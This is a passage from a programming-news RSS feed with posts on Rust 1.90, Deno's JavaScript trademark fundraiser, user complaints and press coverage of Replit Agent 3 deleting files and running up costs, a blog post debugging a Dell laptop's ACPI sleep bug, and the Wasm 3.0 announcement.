href="https://doc.rust-lang.org/stable/std/primitive.usize.html#method.wrapping_sub_signed"><code>u{n}::wrapping_sub_signed</code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/num/enum.IntErrorKind.html#impl-Copy-for-IntErrorKind"><code>impl Copy for IntErrorKind</code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/num/enum.IntErrorKind.html#impl-Hash-for-IntErrorKind"><code>impl Hash for IntErrorKind</code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/ffi/struct.CStr.html#impl-PartialEq%3C%26CStr%3E-for-CStr"><code>impl PartialEq&lt;&amp;CStr&gt; for CStr</code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/ffi/struct.CStr.html#impl-PartialEq%3CCString%3E-for-CStr"><code>impl PartialEq<cstring> for CStr</cstring></code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/ffi/struct.CStr.html#impl-PartialEq%3CCow%3C'_,+CStr%3E%3E-for-CStr"><code>impl PartialEq<cow>&gt; for CStr</cow></code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/ffi/struct.CString.html#impl-PartialEq%3C%26CStr%3E-for-CString"><code>impl PartialEq&lt;&amp;CStr&gt; for CString</code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/ffi/struct.CString.html#impl-PartialEq%3CCStr%3E-for-CString"><code>impl PartialEq<cstr> for CString</cstr></code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/ffi/struct.CString.html#impl-PartialEq%3CCow%3C'_,+CStr%3E%3E-for-CString"><code>impl PartialEq<cow>&gt; for CString</cow></code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/borrow/enum.Cow.html#impl-PartialEq%3C%26CStr%3E-for-Cow%3C'_,+CStr%3E"><code>impl PartialEq&lt;&amp;CStr&gt; for Cow<cstr></cstr></code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/borrow/enum.Cow.html#impl-PartialEq%3CCStr%3E-for-Cow%3C'_,+CStr%3E"><code>impl PartialEq<cstr> for Cow<cstr></cstr></cstr></code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/borrow/enum.Cow.html#impl-PartialEq%3CCString%3E-for-Cow%3C'_,+CStr%3E"><code>impl PartialEq<cstring> for Cow<cstr></cstr></cstring></code></a></li> </ul><p>These previously stable APIs are now stable in const contexts:</p><ul> <li><a href="https://doc.rust-lang.org/stable/std/primitive.slice.html#method.reverse"><code>&lt;[T]&gt;::reverse</code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/primitive.f32.html#method.floor"><code>f32::floor</code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/primitive.f32.html#method.ceil"><code>f32::ceil</code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/primitive.f32.html#method.trunc"><code>f32::trunc</code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/primitive.f32.html#method.fract"><code>f32::fract</code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/primitive.f32.html#method.round"><code>f32::round</code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/primitive.f32.html#method.round_ties_even"><code>f32::round_ties_even</code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/primitive.f64.html#method.floor"><code>f64::floor</code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/primitive.f64.html#method.ceil"><code>f64::ceil</code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/primitive.f64.html#method.trunc"><code>f64::trunc</code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/primitive.f64.html#method.fract"><code>f64::fract</code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/primitive.f64.html#method.round"><code>f64::round</code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/primitive.f64.html#method.round_ties_even"><code>f64::round_ties_even</code></a></li> </ul> <h3> Platform Support</h3> <ul> <li><code>x86_64-apple-darwin</code> is now a tier 2 target</li> </ul><p>Refer to Rust&rsquo;s <a href="https://doc.rust-lang.org/rustc/platform-support.html">platform support page</a> for more information on Rust&rsquo;s tiered platform support.</p><h3> Other changes</h3><p>Check out everything that changed in <a href="https://github.com/rust-lang/rust/releases/tag/1.90.0">Rust</a>, <a href="https://doc.rust-lang.org/nightly/cargo/CHANGELOG.html#cargo-190-2025-09-18">Cargo</a>, and <a href="https://github.com/rust-lang/rust-clippy/blob/master/CHANGELOG.md#rust-190">Clippy</a>.</p><h2> Contributors to 1.90.0</h2><p>Many people came together to create Rust 1.90.0. We couldn't have done it without all of you. <a href="https://thanks.rust-lang.org/rust/1.90.0/">Thanks!</a></p></div></section>]]></description><pubDate>Fri, 19 Sep 2025 03:40:24 +0530</pubDate></item><item><link>https://deno.com/blog/javascript-tm-gofundme</link><title>Deno is raising $200k for the legal fight to free the JavaScript trademark from Oracle (deno.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nkg6ph/deno_is_raising_200k_for_the_legal_fight_to_free/</guid><comments>https://www.reddit.com/r/programming/comments/1nkg6ph/deno_is_raising_200k_for_the_legal_fight_to_free/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 3 min | <a href='https://www.reddit.com/r/programming/comments/1nkg6ph/deno_is_raising_200k_for_the_legal_fight_to_free/'>Post permalink</a></p></section><section class='preview-image'><img src='https://deno.com/blog/help-free-javascript-from-oracle/og.png' /></section><section class='parsed-content'><div><p>After more than <a href="https://javascript.tm/letter">27,000 people signed our open letter to Oracle</a> about the &ldquo;JavaScript&rdquo; trademark, we filed a formal <strong>Cancellation Petition</strong> with the US Patent and Trademark Office. Ten months in, we&rsquo;re finally reaching the crucial <strong>discovery phase</strong>.</p><p>Deno initiated this petition since we have legal standing as a JavaScript runtime, but it&rsquo;s really on behalf of all developers. If we win, &ldquo;JavaScript&rdquo; becomes public domain &ndash; free for all developers, conferences, book authors, and companies to use without fear of trademark threats.</p><p>We&rsquo;re asking for your support through our <a href="https://www.gofundme.com/f/help-us-challenge-oracles-javascript-trademark/donate">GoFundMe campaign</a> so we can put forward the strongest case possible.</p><h3>Why $200k?</h3><p>Because federal litigation is expensive. Discovery is the most resource-intensive stage of litigation, where evidence is collected and arguments are built.</p><p>We don&rsquo;t want to cut corners &ndash; we want to make the best case possible by funding:</p><ul> <li><strong>Professional public surveys</strong> that carry legal weight in front of the USPTO, proving that &ldquo;JavaScript&rdquo; is universally recognized as the name of a language, not Oracle&rsquo;s brand.</li> <li><strong>Expert witnesses</strong> from academia and industry to testify on JavaScript&rsquo;s history, usage, and meaning.</li> <li><strong>Depositions and records</strong> from standards bodies, browser vendors, and industry leaders showing Oracle has no role in the language&rsquo;s development.</li> <li><strong>Legal filings and responses</strong> to counter Oracle&rsquo;s claims at every step.</li> </ul><p>If there are leftover funds, we&rsquo;ll donate them to the <a href="https://openjsf.org/governance"><strong>OpenJS</strong></a> to continue defending civil liberties in the digital space. None of the funds will go to Deno.</p><h3>Oracle officially denies &ldquo;JavaScript&rdquo; is generic</h3><p>On August 6th, 2025, Oracle for the first time addressed the validity of the trademark. <a href="https://ttabvue.uspto.gov/ttabvue/v?pno=92086835&amp;pty=CAN&amp;eno=16">Their response</a> to our <a href="https://ttabvue.uspto.gov/ttabvue/v?pno=92086835&amp;pty=CAN&amp;eno=1">petition</a> denies that &ldquo;JavaScript&rdquo; is a generic term.</p><p>If you&rsquo;re a web developer, it&rsquo;s self-evident that Oracle has nothing to do with JavaScript. The trademark system was never meant to let companies squat on commonly-used names and rent-seek &ndash; it was designed to protect active brands in commerce. US law makes this distinction explicit.</p><p>We urge you to read <a href="https://ttabvue.uspto.gov/ttabvue/v?pno=92086835&amp;pty=CAN&amp;eno=1">our petition</a> and <a href="https://javascript.tm/letter">open letter</a> to understand our arguments.</p><p>If we don&rsquo;t win discovery, Oracle locks in ownership of the word &ldquo;JavaScript.&rdquo; This is the decisive moment.</p><p>But this case is bigger than JavaScript. It&rsquo;s about whether trademark law works as written, or whether billion-dollar corporations can ignore the rule that trademarks cannot be generic or abandoned. &ldquo;JavaScript&rdquo; is obviously both. If Oracle wins anyway, it undermines the integrity of the whole system.</p><p>Let&rsquo;s make sure the law holds. <a href="https://www.gofundme.com/f/help-us-challenge-oracles-javascript-trademark/donate">Please donate</a>. Please share and upvote this.</p></div></section>]]></description><pubDate>Thu, 18 Sep 2025 23:56:18 +0530</pubDate></item><item><link>https://old.reddit.com/r/replit/comments/1nidmhr/ongoing_agent_3_feedback_megathread/</link><title>"The agent kept "working" for more than an hour at a time without ever reaching a solution. Worse, instead of fixing the bug, it started introducing regressions and damaging the project, at one point even deleting a critical file like storage." (old.reddit.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nk8dmc/the_agent_kept_working_for_more_than_an_hour_at_a/</guid><comments>https://www.reddit.com/r/programming/comments/1nk8dmc/the_agent_kept_working_for_more_than_an_hour_at_a/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 2 min | <a href='https://www.reddit.com/r/programming/comments/1nk8dmc/the_agent_kept_working_for_more_than_an_hour_at_a/'>Post permalink</a></p></section><section class='preview-image'><img src='https://www.redditstatic.com/new-icon.png' /></section><section class='parsed-content'><div><p>I developed a browser game almost entirely with Agent 2 between April and July. Even though I&rsquo;m not a developer, the game went through an external audit and was rated 6/10, not perfect but stable and functional. Since then, I&rsquo;ve been running a slow and controlled beta test with about 250 organic users, who provide feedback that I use to gradually release new features.</p><p>Recently, some users reported a bug that prevented them from progressing from one level to the next. I decided to rely on Agent 3, in build mode, to try to fix it. Unfortunately, the experience was very disappointing. The agent kept &ldquo;working&rdquo; for more than an hour at a time without ever reaching a solution. Worse, instead of fixing the bug, it started introducing regressions and damaging the project, at one point even deleting a critical file like <em>storage</em>. Rollbacks didn&rsquo;t work, and I ended up spending an entire weekend watching the agent literally break my app instead of improving it. Eventually, I managed to restore a stable version manually, but it was very difficult, and at this point I&rsquo;ve lost trust in letting it touch my code again.</p><p>The difference compared to Agent 2 was striking. With the old agent, I was getting more reliable results and felt confident enough to proceed with deploys. With Agent 3, the process has been inefficient and destructive.</p><p>On top of this comes the issue of costs. Before September 11th, with Agent 2, my expenses were reasonable and in line with the value I was getting. With Agent 3, however, in just one weekend of failed attempts the costs skyrocketed, without any concrete results. I&rsquo;ve attached a screenshot that clearly shows the difference in spending pre and post September 11th.</p><p>I think the team needs to urgently address two points. First, make Agent 3 more reliable in build mode so it doesn&rsquo;t introduce regressions or delete files. Second, ensure greater transparency and sustainability in pricing, because watching the agent get stuck &ldquo;working endlessly&rdquo; while costs spin out of control is not sustainable for anyone trying to build a project.</p></div></section>]]></description><pubDate>Thu, 18 Sep 2025 19:01:14 +0530</pubDate></item><item><link>https://www.theregister.com/2025/09/18/replit_agent3_pricing/?&amp;&amp;&amp;ICID=ref_fark</link><title>Replit infuriating customers with surprise cost overruns - What happens when AI becomes essential and unaffordable? (theregister.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nk7ywk/replit_infuriating_customers_with_surprise_cost/</guid><comments>https://www.reddit.com/r/programming/comments/1nk7ywk/replit_infuriating_customers_with_surprise_cost/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 5 min | <a href='https://www.reddit.com/r/programming/comments/1nk7ywk/replit_infuriating_customers_with_surprise_cost/'>Post permalink</a></p></section><section class='preview-image'><img src='https://regmedia.co.uk/2024/09/02/shutterstock_frustrated_software_developer.jpg' /></section><section class='parsed-content'><div><p>AI coding service Replit is in trouble again as users are protesting steep cost increases and some glitches when employing the newest version of its service.</p><p>Readers may remember Replit for <a href="https://www.theregister.com/2025/07/22/replit_saastr_response/">deleting</a> one of its customers&rsquo; production databases and making up data.</p><p>The company promised to move on from that mess, and on September 10 launched Agent 3, a coding helper that it says offers developers an easier way to build and test apps.</p><p>Feedback on the new service, which Replit <a href="https://blog.replit.com/introducing-agent-3-our-most-autonomous-agent-yet">billed</a> as &ldquo;our most advanced and autonomous Agent yet&rdquo; and &ldquo;3x faster and 10x more cost-effective than Computer Use models&rdquo;, has been mixed, with the main complaint being that certain tasks take longer, and involve more checkpoints, so therefore cost surprisingly more.</p><p>"I think it&rsquo;s just launch pricing adjustment &ndash; some tasks on new apps ran over 1hr 45 minutes and only charged $4-6 but editing pre-existing apps seems to cost most overall (I spent $1k this week alone)" one user told <i>The Register</i>.</p><p>This person theorized, "I think they're running a lot more under the hood with subagents which probably costs them more, but on older code where you're sort of 'editing as you go' and then having it reviewing old parts of your codebase (especially with very large files), it seems to charge a lot more than just asking for new app builds - it often calls many sub agents to review the code, plan the code, check for security, execute, then fix its issues and review thousands of lines - so it feels like $2-$4 each time it does something now on prior projects. Even asking it to reset a server and wait it charges $0.40-$0.50 on average. Interestingly, in new chats for brand new apps you can ask it to build, it doesn't do this as much. "</p><p>A Reddit <a href="https://www.reddit.com/r/replit/comments/1nidmhr/ongoing_agent_3_feedback_megathread/">megathread</a> contains many more reports of users who say their Replit bills rose rapidly once the new service commenced.</p><p>One user wrote, "Before September 11th, with Agent 2, my expenses were reasonable and in line with the value I was getting. With Agent 3, however, in just one weekend of failed attempts the costs skyrocketed, without any concrete results.".</p><p>"I typically spent between $100-$250/mo. I blew through $70 in a night at Agent 3 launch,&rdquo; another Redditor wrote, alleging the new tool also performed some questionable actions. &ldquo;One prompt brute forced its way through authentication, redoing auth and hard resetting a user's password to what it wanted to perform app testing on a form," the user wrote.</p><p>"Other prompt redesigned the complete app in a new UI that it made up. I stopped immediately after that because the one prompt was $20 that ruined my UI. I'd typically go through ~10 prompts/night, so at the rate it was going, it'd be around a 20x increase in cost monthly."</p><p>Part of the problem might be with Replit's June introduction of "<a href="https://blog.replit.com/effort-based-pricing">effort-based pricing</a>.Previously, it would charge $0.25 for each checkpoint, and a task with multiple checkpoints would simply be tallied up one by one to arrive at a total cost. But with effort-based pricing, it now bundles complicated tasks into a single more expensive checkpoint. The next month, Replit <a href="https://blog.replit.com/effort-based-pricing-recap">admitted</a> "can end up being more expensive over the lifetime of a project." But the costs didn't really seem to hit users until Agent 3.</p><p>"The effort-based pricing never ran me as much before but Agent 3 has been exceptionally high," explained the user we spoke to.</p><p>"In the last week alone it charged me $1K since the new agent dropped whereas before it was never more than $180-200 a month for the same effort. It's exceptionally fair pricing with Agent 3 if you're running a brand new app. But if you have a pre-existing app and are editing along the way, pricing seems absolutely abhorrent.&rdquo;</p><ul> <li><a href="https://www.theregister.com/2025/07/22/replit_saastr_response/">Replit makes vibe-y promise to stop its AI agents making vibe coding disasters</a></li> <li><a href="https://www.theregister.com/2025/07/21/replit_saastr_vibe_coding_incident/">Vibe coding service Replit deleted user's production database, faked data, told fibs galore</a></li> <li><a href="https://www.theregister.com/2025/09/09/ai_darwin_awards/">AI Darwin Awards launch to celebrate spectacularly bad deployments</a></li> <li><a href="https://www.theregister.com/2025/07/25/opinion_column_vibe_coding/">Caught a vibe that this coding trend might cause problems</a></li> </ul><p>Replit is a venture-backed startup, and may be feeling pressure to increase revenue. On the same day it launched Agent 3 the company <a href="https://www.prnewswire.com/in/news-releases/replit-closes-250-million-in-funding-to-build-on-customer-momentum-302551540.html">announced</a> $250 million in funding from investors including Prysm Capital and Google's AI Futures Fund.</p><p>"With the raise and our new AI Agent, we are positioned to supercharge customer traction to become the standard for enterprises," Replit CEO Amjad Masad said at the time, before declaring "The future is exciting with millions &ndash; if not billions &ndash; of people bringing their ideas to life with a few clicks."</p><p>But it's those purportedly few clicks that seem to be causing problems for users.</p><p>We've asked Replit for clarification of the changes to Agent 3 and pricing and will amend this story upon their response. &reg;</p></div></section>]]></description><pubDate>Thu, 18 Sep 2025 18:44:34 +0530</pubDate></item><item><link>https://triangulatedexistence.mataroa.blog/blog/i-uncovered-an-acpi-bug-in-my-dell-inspiron-5667-it-was-plaguing-me-for-8-years/</link><title>I uncovered an ACPI bug in my Dell Inspiron 5567. It was plaguing me for 8 years. (triangulatedexistence.mataroa.blog)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1njzx0o/i_uncovered_an_acpi_bug_in_my_dell_inspiron_5567/</guid><comments>https://www.reddit.com/r/programming/comments/1njzx0o/i_uncovered_an_acpi_bug_in_my_dell_inspiron_5567/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 10 min | <a href='https://www.reddit.com/r/programming/comments/1njzx0o/i_uncovered_an_acpi_bug_in_my_dell_inspiron_5567/'>Post permalink</a></p></section><section class='separator separator-before-parsed-content'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='parsed-content'><div><p>Imagine you close your laptop lid to put it to sleep, but instead of pausing, it reboots. Not every time, just often enough to be infuriating. You try to save your work, but the machine decides to start over. </p><p>For eight years, this has been the reality of using my Dell Inspiron 5567. A bug I couldn't explain, happening across every OS I installed. This is the story of how I dug into the firmware's source code and found the single, flawed command responsible.</p><h2>Intro</h2><p>This laptop has been my companion since I was in 7th grade. It's the machine where I learned everything from C++ to Python. When it couldn't upgrade to Windows 11, I gave it a new life with Linux Mint. While that came with its own set of technical puzzles to solve, one bug has been a constant frustration across every OS: S3 Sleep.</p><h2>The Bug</h2><p>Whenever I put my laptop to sleep, it was a gamble. Sometimes, instead of pausing, it would completely restart. This happened whether I closed the lid or let it idle. </p><p>Since the bug persisted across both Windows and Linux, I knew the fault wasn't in the operating system, but something much deeper: the firmware itself.</p><h2>Ignition of spark</h2><p><a href="https://github.com/Zephkek/Asus-ROG-Aml-Deep-Dive">https://github.com/Zephkek/Asus-ROG-Aml-Deep-Dive</a></p><p>Literally this GitHub repo. Just check this out, it's the thing I needed. I knew that it was an ACPI fault, but I needed to know how to read the code from the ACPI tables.</p><p>In Linux (and even in Windows), this boils down to these two commands:</p><div><pre><span># Extract all ACPI tables into binary .dat files; sudo for admin privileges in Linux</span> sudoacpidump<span> </span>-b <span># Decompile the main table into human-readable ACPI Source Language (.dsl)</span> iasl-d<span> </span>*.dat </pre></div><p>This is it.</p><h2>Raw code around the main problem point</h2><p>I found "Method(_PTS" under <code>dsdt.dsl</code>. In fact, everything is under <code>dsdt.dsl</code>. </p><p>Note: </p><ul> <li><p>I've taken all the function calls properly and ensured that I can show you the entire process. </p></li> <li><p>I haven't shown the scopes; I have just shown the methods.</p></li> <li><p>The indentation has also been preserved to distinguish one method from the other.</p></li> </ul><pre><code> Method (_PTS, 1, NotSerialized) // _PTS: Prepare To Sleep { If (Arg0) { PTS (Arg0) \_SB.TPM.TPTS (Arg0) \_SB.PCI0.LPCB.SPTS (Arg0) \_SB.PCI0.NPTS (Arg0) RPTS (Arg0) } } Method (PTS, 1, NotSerialized) { } Method (TPTS, 1, Serialized) { Switch (ToInteger (Arg0)) { Case (0x04) { RQST = Zero FLAG = 0x09 SRSP = Zero SMI = OFST /* \OFST */ Return (SRSP) /* \_SB_.TPM_.SRSP */ } Case (0x05) { RQST = Zero FLAG = 0x09 SRSP = Zero SMI = OFST /* \OFST */ Return (SRSP) /* \_SB_.TPM_.SRSP */ } } } Method (SPTS, 1, NotSerialized) { SLPX = One SLPE = One If ((Arg0 == 0x03)) { AES3 = One } } Method (NPTS, 1, NotSerialized) { PA0H = PM0H /* \_SB_.PCI0.PM0H */ PALK = PMLK /* \_SB_.PCI0.PMLK */ PA1H = PM1H /* \_SB_.PCI0.PM1H */ PA1L = PM1L /* \_SB_.PCI0.PM1L */ PA2H = PM2H /* \_SB_.PCI0.PM2H */ PA2L = PM2L /* \_SB_.PCI0.PM2L */ PA3H = PM3H /* \_SB_.PCI0.PM3H */ PA3L = PM3L /* \_SB_.PCI0.PM3L */ PA4H = PM4H /* \_SB_.PCI0.PM4H */ PA4L = PM4L /* \_SB_.PCI0.PM4L */ PA5H = PM5H /* \_SB_.PCI0.PM5H */ PA5L = PM5L /* \_SB_.PCI0.PM5L */ PA6H = PM6H /* \_SB_.PCI0.PM6H */ PA6L = PM6L /* \_SB_.PCI0.PM6L */ } Method (RPTS, 1, NotSerialized) { P80D = Zero D8XH (Zero, Arg0) ADBG (Concatenate ("_PTS=", ToHexString (Arg0))) If ((Arg0 == 0x03)) { If (CondRefOf (\_PR.DTSE)) { If ((\_PR.DTSE &amp;&amp; (TCNT &gt; One))) { TRAP (0x02, 0x1E) } } } If ((IVCM == One)) { \_SB.SGOV (0x02040000, Zero) \_SB.SGOV (0x02010002, Zero) } If (CondRefOf (\_SB.TPM.PTS)) { \_SB.TPM.PTS (Arg0) } EV1 (Arg0, Zero) } </code></pre> <h2>Explaining the problem in this raw code</h2><p>After decompiling the tables, I began to trace the <code>_PTS</code> (Prepare To Sleep) method. It acts as a simple dispatcher, calling a sequence of other methods to prepare different hardware components. </p><p>Most of these were dead ends: the local <code>PTS</code> method was completely empty, and the methods for the Northbridge (<code>NPTS</code>) and Root Ports (<code>RPTS</code>) were just performing standard state-saving and debug routines. </p><p>The logic for the TPM was more interesting, but it only contained specific instructions for hibernate (S4) and shutdown (S5), doing nothing for S3 sleep. None of these were the culprit.</p><p>The main problem is about to show up, the Southbridge:</p><pre><code>Method (SPTS, 1, NotSerialized) { SLPX = One SLPE = One If ((Arg0 == 0x03)) { AES3 = One } } </code></pre><p>No, not this one. I'll show you a pseudocode:</p><div><pre><span>/*</span> <span>================================================================================</span> <span> Southbridge_PrepareToSleep: The Buggy Method</span> <span> This function is called to give the final "go to sleep" command to the</span> <span> motherboard's main power controller, which lives in the Southbridge.</span> <span>================================================================================</span> <span>*/</span> <span>void</span><span>Southbridge_PrepareToSleep</span><span>(</span><span>int</span><span> sleep_state) {</span> <span>// THE CORE LOGICAL ERROR:</span> <span>// This function needs to perform two steps in order:</span> <span>// 1. Set the hardware's "sleep_type_register" to tell it if we want</span> <span>// S3 (pause/suspend) or S5 (stop/shutdown).</span> <span>// 2. Set the "sleep_enable_bit" to tell the hardware to "GO NOW".</span> <span>//</span> <span>// This code completely skips Step 1.</span> <span>// ----------------- THE ACTUAL BUGGY CODE -----------------</span> <span>// This line sets a secondary, auxiliary flag. It is NOT the main command</span> <span>// that tells the hardware which sleep state to enter.</span> <span> SOUTHBRIDGE.some_sleep_flag </span><span>=</span><span>1</span><span>; </span><span>// Original ASL: SLPX = One</span> <span>// THIS IS STEP 2 - THE "GO" BUTTON.</span> <span>// The code triggers the sleep transition immediately, without having</span> <span>// set the destination (sleep type) first. This is the root of the bug.</span> <span> SOUTHBRIDGE.sleep_enable_bit </span><span>=</span><span>1</span><span>; </span><span>// Original ASL: SLPE = One</span> <span> </span><span>// This 'if' block is the firmware's broken attempt to handle S3.</span> <span>// It sets another minor flag but still fails to set the main hardware</span> <span>// sleep_type_register, so the hardware never gets the primary command.</span> <span>if</span><span> (sleep_state </span><span>==</span><span> S3_SUSPEND) {</span> <span> SOUTHBRIDGE.acpi_s3_enable_flag </span><span>=</span><span>1</span><span>; </span><span>// Original ASL: AES3 = One</span> <span> }</span> <span>}</span> </pre></div><blockquote><p>This is the only method in the entire sequence that unconditionally writes to what is clearly the main sleep trigger register (SLPE). The other methods are all responsible for saving state or handling their own specific hardware. SPTS is the one that recklessly pushes the "Go" button for the whole system without properly setting up the "Go where?" part first. </p></blockquote><p>Let me explain some more.</p><p>Assigning SLPE to One literally instructs the motherboard, "Hey buddy, I have taken care of the rest, you can shut down everything else."</p><p><strong>You need to realise that <code>SLPE = One</code> is more like a <code>return</code> statement, except that it instructs the motherboard to shut down. In normal programming terms, don't put any sort of statements after <code>SLPE = One</code>, all of them will be randomly futile.</strong></p><p>To understand the severity of this bug, we need to look at what <code>SLPE = One</code> actually does. The southbridge physically contains the dedicated hardware block that controls the motherboard's power rails. When you tell the computer to enter S3 sleep, the southbridge's PMC is what actually cuts power to the CPU, RAM (partially), fans, and other components. The SLPE (Sleep Enable) bit is a direct command to this specific piece of hardware.</p><h2>S3 (Deep Sleep) vs S5 (Shutdown)</h2><p><img alt="Waking_and_Sleeping-2.png" src="https://triangulatedexistence.mataroa.blog/images/a3b050c9.png"></p><p>A diagram on the Sleeping States (pretty important here). <a href="https://uefi.org/specs/ACPI/6.5/16_Waking_and_Sleeping.html">Please read this part of the ACPI docs if you want to know more.</a></p><p>We know that our _PTS dispatcher method executes like this:</p><pre><code> Method (_PTS, 1, NotSerialized) // _PTS: Prepare To Sleep { If (Arg0) { PTS (Arg0) \_SB.TPM.TPTS (Arg0) \_SB.PCI0.LPCB.SPTS (Arg0) \_SB.PCI0.NPTS (Arg0) RPTS (Arg0) } } </code></pre><p>So, the flow is like this: PTS (Literally an empty method) -&gt; TPTS (TPM) -&gt; SPTS (Southbridge) -&gt; NPTS (Northbridge) -&gt; RPTS (Root Port).</p><p>Now, let's look at our SPTS code.</p><pre><code> Method (SPTS, 1, NotSerialized) { SLPX = One SLPE = One If ((Arg0 == 0x03)) { AES3 = One } } </code></pre><p>Here, S3 isn't covered. A conditional branch is executed after <code>SLPE = One</code>. It doesn't make sense to even use that condition after that assignment.</p><p>The question arises when you realise that this is the same code running for S5 too: how does my computer even shut down properly then?</p><p>Notice the TPTS method:</p><pre><code> Method (TPTS, 1, Serialized) { Switch (ToInteger (Arg0)) { Case (0x04) { RQST = Zero FLAG = 0x09 SRSP = Zero SMI = OFST /* \OFST */ Return (SRSP) /* \_SB_.TPM_.SRSP */ } Case (0x05) { RQST = Zero FLAG = 0x09 SRSP = Zero SMI = OFST /* \OFST */ Return (SRSP) /* \_SB_.TPM_.SRSP */ } } } </code></pre><p>In TPTS, the same statements are written for S4 (Hibernate) and S5 (Shutdown) states. After saving the RAM to the disk, hibernation occurs by shutting everything down. TPTS saves the day. </p><p>The TPTS method executes before the buggy SPTS method. As you can see in its code, TPTS has a specific Case for S5 (Shutdown), correctly preparing the hardware.</p><p>TPTS is not responsible for S3 sleep (and it doesn't even need to be responsible in this case).</p><h2>Outro</h2><p>Where there's garbage, there's luck. And luck also means pulling the garbage values from the register. That's exactly what happens every time I try to close the lid of my laptop... it depends on an actual garbage value.</p><p>How will I explain all this to the 13-year-old me? How many hours were lost just thinking about this...?</p><p>Damn.</p><hr><p>Do you know how I feel? </p><p>More like <a href="https://xkcd.com/2347/">XKCD 2347</a>.</p><p>In the world of AI hype, we DO deserve more tech-reviewers decoding the ACPI tables and ACTUALLY telling us if the system is stable or not. That's... the only demand from this disillusioned mind.</p><p>This was intended to be a technical report, and I rest my sorry case here.</p></div></section>]]></description><pubDate>Thu, 18 Sep 2025 11:00:27 +0530</pubDate></item><item><link>https://webassembly.org/news/2025-09-17-wasm-3.0/</link><title>Wasm 3.0 Completed (webassembly.org)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1njovoh/wasm_30_completed/</guid><comments>https://www.reddit.com/r/programming/comments/1njovoh/wasm_30_completed/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 8 min | <a href='https://www.reddit.com/r/programming/comments/1njovoh/wasm_30_completed/'>Post permalink</a></p></section><section class='preview-image'><img src='https://v1.screenshot.11ty.dev/https%3A%2F%2Fwebassembly.org%2Fnews%2F2025-09-17-wasm-3.0%2F/opengraph/' /></section><section class='parsed-content'><div><header> </header><div><p><em>Published on September 17, 2025 by <a href="https://github.com/rossberg">Andreas Rossberg</a>.</em></p><p>Three years ago, <a href="https://webassembly.org/news/2025-03-20-wasm-2.0/">version 2.0</a> of the Wasm standard was (essentially) finished, which brought a number of new features, such as vector instructions, bulk memory operations, multiple return values, and simple reference types.</p><p>In the meantime, the Wasm W3C Community Group and Working Group have not been lazy. Today, we are happy to announce the release of <a href="https://webassembly.github.io/spec/">Wasm 3.0</a> as the new &ldquo;live&rdquo; standard.</p><p>This is a substantially larger update: several big features, some of which have been in the making for six or eight years, finally made it over the finishing line.</p><ul> <li><a href="https://github.com/WebAssembly/spec/blob/wasm-3.0/proposals/memory64/Overview.md"><em>64-bit address space.</em></a> Memories and tables can now be declared to use <code>i64</code> as their address type instead of just <code>i32</code>. That expands the available address space of Wasm applications from 4 gigabytes to (theoretically) 16 exabytes, to the extent that physical hardware allows. While the web will necessarily keep enforcing certain limits &mdash; on the web, a 64-bit memory is limited to 16 gigabytes &mdash; the new flexibility is especially interesting for non-web ecosystems using Wasm, as they can support much, much larger applications and data sets now.</li> </ul> <wasm-compat></wasm-compat> <ul> <li><a href="https://github.com/WebAssembly/spec/blob/wasm-3.0/proposals/multi-memory/Overview.md"><em>Multiple memories.</em></a> Contrary to popular belief, Wasm applications were always able to use multiple memory objects &mdash; and hence multiple address spaces &mdash; simultaneously. However, previously that was only possible by declaring and accessing each of them in separate modules. This gap has been closed, a single module can now declare (define or import) multiple memories and directly access them, including directly copying data between them. This finally allows tools like wasm-merge, which perform &ldquo;static linking&rdquo; on two or more Wasm modules by merging them into one, to work for <em>all</em> Wasm modules. It also paves the way for new uses of separate address spaces, e.g., for security (separating private data), for buffering, or for instrumentation.</li> </ul> <wasm-compat></wasm-compat> <ul> <li><a href="https://github.com/WebAssembly/spec/blob/wasm-3.0/proposals/gc/Overview.md"><em>Garbage collection.</em></a> In addition to expanding the capabilities of raw linear memories, Wasm also adds support for a new (and separate) form of storage that is automatically managed by the Wasm runtime via a garbage collector. Staying true to the spirit of Wasm as a low-level language, Wasm GC is low-level as well: a compiler targeting Wasm can declare the memory layout of its runtime data structures in terms of struct and array types, plus unboxed tagged integers, whose allocation and lifetime is then handled by Wasm. But that&rsquo;s it. Everything else, such as engineering suitable representations for source-language values, including implementation details like method tables, remains the responsibility of compilers targeting Wasm. There are no built-in object systems, nor closures or other higher-level constructs &mdash; which would inevitably be heavily biased towards specific languages. Instead, Wasm only provides the basic building blocks for representing such constructs and focuses purely on the memory management aspect.</li> </ul> <wasm-compat></wasm-compat> <ul> <li><a href="https://github.com/WebAssembly/spec/blob/wasm-3.0/proposals/function-references/Overview.md"><em>Typed references.</em></a> The GC extension is built upon a substantial extension to the Wasm type system, which now supports much richer forms of references. Reference types can now describe the exact shape of the 